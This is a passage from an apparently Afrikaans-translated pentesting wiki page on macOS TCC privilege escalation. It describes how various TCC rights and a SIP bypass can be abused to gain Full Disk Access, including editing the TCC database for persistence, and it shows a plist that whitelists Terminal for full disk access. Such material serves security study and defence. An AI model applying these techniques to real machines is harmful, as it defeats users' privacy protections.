Kyk na hierdie bladsy vir [**payloads om die Accessibility-toestemmings te misbruik**](macos-tcc-payloads.md#accessibility) om byvoorbeeld na FDA\* te privesc of ’n keylogger te laat loop.

### **Endpoint Security Client na FDA**

As jy **`kTCCServiceEndpointSecurityClient`** het, het jy FDA. Klaar.

### System Policy SysAdmin File na FDA

**`kTCCServiceSystemPolicySysAdminFiles`** laat jou toe om die **`NFSHomeDirectory`**-kenmerk van ’n gebruiker te **verander**, wat sy tuisgids verander en jou dus toelaat om **TCC te omseil**.<sup>[[5]](#references)</sup>

### User TCC DB na FDA

As jy **skryftoestemmings** op die **user TCC**-databasis verkry, **kan** jy nie vir jouself **`FDA`**-toestemmings toestaan nie; slegs die databasis in die stelsel kan dit toestaan.

Maar jy kan vir jouself **Automation-regte vir Finder** gee en die vorige tegniek misbruik om na FDA\* te eskaleer.

### **FDA na TCC-toestemmings**

Die TCC-naam vir **Full Disk Access** is **`kTCCServiceSystemPolicyAllFiles`**

Ek dink nie dit is ’n werklike privesc nie, maar dalk vind jy dit nuttig: As jy ’n program met FDA beheer, kan jy die gebruiker se TCC-databasis **wysig en vir jouself enige toegang gee**. Dit kan nuttig wees as ’n persistence-tegniek indien jy dalk jou FDA-toestemmings verloor.

### **SIP-omseiling na TCC-omseiling**

Die stelsel se **TCC-databasis** word deur **SIP** beskerm; daarom sal slegs prosesse met die **aangeduide entitlements dit kan wysig**. As ’n aanvaller dus ’n **SIP-omseiling** vir ’n **lêer** vind (die lêer kan wysig wat deur SIP beperk word), sal hy die volgende kan doen:

- **Die beskerming** van ’n TCC-databasis **verwyder** en homself alle TCC-toestemmings gee. Hy kan byvoorbeeld enige van hierdie lêers misbruik:
  - Die TCC-stelseldatabasis
  - REG.db
  - MDMOverrides.plist

Daar is egter nog ’n manier om hierdie **SIP-omseiling te misbruik om TCC te omseil**: die lêer `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` is ’n toelatingslys van toepassings wat ’n TCC-uitsondering vereis. As ’n aanvaller dus **die SIP-beskerming** van hierdie lêer kan **verwyder** en sy **eie toepassing** kan byvoeg, sal die toepassing TCC kan omseil.\
Byvoorbeeld, om Terminal by te voeg:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### TCC-omseilings


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [’n Diepgaande blik op macOS TCC.db - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script om com.apple.macl na te spoor (Gist deur brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Spoor com.apple.macl na en pak dit aan](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Omseiling van macOS TCC-gebruikersprivaatheidsbeskerming per ongeluk en doelbewus](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Verander die tuisgids en omseil TCC, oftewel CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [SQL Injection in TCC: en waarom dit (waarskynlik) nie ’n sekuriteitsrisiko was nie (hierdie keer)](https://wts.dev/posts/tcc-sql-injection/)
- [7] [Ligging en verkryging van TCC.db op macOS](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [Stel die macOS App Sandbox op](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Kameratoestemmingsreg](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Instellings vir die loonvrag vir toestelbestuur van die beleidbeheer vir privaatheidvoorkeure vir Apple-toestelle](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [Ontleding van ’n macOS-inbraak, van lokmiddel tot kompromittering](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
